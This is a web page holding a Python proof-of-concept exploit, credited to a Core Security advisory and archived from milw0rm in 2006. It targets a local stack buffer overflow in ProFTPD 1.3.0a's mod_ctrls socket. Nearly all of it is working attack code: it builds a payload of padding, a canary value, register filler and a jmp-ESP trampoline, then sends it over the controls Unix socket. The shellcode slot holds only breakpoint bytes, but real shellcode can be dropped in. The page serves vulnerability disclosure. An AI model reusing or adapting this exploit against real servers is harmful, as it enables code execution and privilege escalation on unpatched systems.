<html><head><title>ProFTPD <= 1.3.0a (mod_ctrls support) Local Buffer Overflow PoC</title></head><pre>#    Core Security Technologies - Corelabs Advisory
#    ProFTPD Controls buffer overflow

import socket
import os, os.path,stat

#This works with default proftpd 1.3.0a compiled with gcc 4.1.2 (ubuntu edgy)
#
ctrlSocket = &quot;/tmp/ctrls.sock&quot;
mySocket = &quot;/tmp/notused.sock&quot;
canary = &quot;\0\0\x0a\xff&quot;
trampoline = &quot;\x77\xe7\xff\xff&quot; # jmp ESP on vdso
shellcode = &quot;\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc&quot; # inocuous &quot;int 3&quot;

#Build Payload. The format on the stack is:
#
#AAAA = EBX BBBB = ESI CCCC = EDI DDDD = EBP EEEE = EIP
payload = (&quot;A&quot;*512) + canary + &quot;AAAABBBBCCCCDDDD&quot; + trampoline + shellcode

#Setup socket
#
if os.path.exists(mySocket):
       os.remove(mySocket)
s = socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
s.bind(mySocket)
os.chmod(mySocket,stat.S_IRWXU)
s.connect(ctrlSocket)

#Send payload
#
s.send(&quot;\1\0\0\0&quot;)
s.send(&quot;\1\0\0\0&quot;)
l = len(payload)
s.send(chr(l &amp; 255)+chr((l/255) &amp; 255)+&quot;\0\0&quot;)
s.send(payload)

#Finished
#
s.close()

# milw0rm.com [2006-12-13]</pre></html>